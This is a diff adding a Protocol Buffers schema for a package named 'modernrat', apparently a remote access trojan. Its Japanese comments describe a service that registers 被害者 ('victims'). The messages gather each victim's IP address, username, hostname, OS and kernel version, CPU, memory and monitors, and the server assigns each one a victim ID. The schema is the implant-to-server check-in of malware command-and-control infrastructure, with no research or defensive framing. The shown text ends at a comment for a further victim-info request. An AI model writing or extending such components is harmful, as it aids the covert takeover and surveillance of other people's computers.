@@ -1,0 +1,65 @@
+syntax = "proto3";
+
+package modernrat;
+
+option go_package = "github.com/modernrat/proto";
+
+// 被害者登録サービス
+service UserRegistrationService {
+  // 被害者を登録する
+  rpc RegisterUser(RegisterUserRequest) returns (RegisterUserResponse);
+}
+
+// CPU情報
+message CPUInfo {
+  string model = 1;           // CPUモデル名
+  int32 cores = 2;            // コア数
+  int32 threads = 3;          // スレッド数
+  double frequency_mhz = 4;   // 周波数（MHz）
+  string architecture = 5;    // アーキテクチャ（x86_64, arm64等）
+}
+
+// OS情報
+message OSInfo {
+  string name = 1;            // OS名（Windows, Linux, macOS等）
+  string version = 2;         // OSバージョン
+  string build = 3;           // ビルド番号
+  string kernel_version = 4;  // カーネルバージョン
+}
+
+// モニター情報
+message MonitorInfo {
+  int32 width = 1;            // 横解像度
+  int32 height = 2;           // 縦解像度
+  bool is_primary = 3;        // プライマリモニターかどうか
+  string name = 4;            // モニター名
+}
+
+// システム情報
+message SystemInfo {
+  string ip_address = 1;              // IPアドレス
+  string username = 2;                // 被害者名
+  OSInfo os_info = 3;                 // OS情報
+  int32 monitor_count = 4;            // モニターの数
+  repeated MonitorInfo monitors = 5;  // モニター詳細情報
+  CPUInfo cpu_info = 6;               // CPU情報
+  int64 total_memory_mb = 7;          // 総メモリ量（MB）
+  string hostname = 8;                // ホスト名
+}
+
+// 被害者登録リクエスト
+message RegisterUserRequest {
+  SystemInfo system_info = 1;         // システム情報
+  string user_agent = 2;              // 被害者エージェント（オプション）
+  int64 timestamp = 3;                // タイムスタンプ
+}
+
+// 被害者登録レスポンス
+message RegisterUserResponse {
+  bool success = 1;                   // 登録成功フラグ
+  string user_id = 2;                 // 生成された被害者ID
+  string message = 3;                 // メッセージ
+  int64 registered_at = 4;            // 登録日時
+}
+
+// 被害者情報取得リクエスト
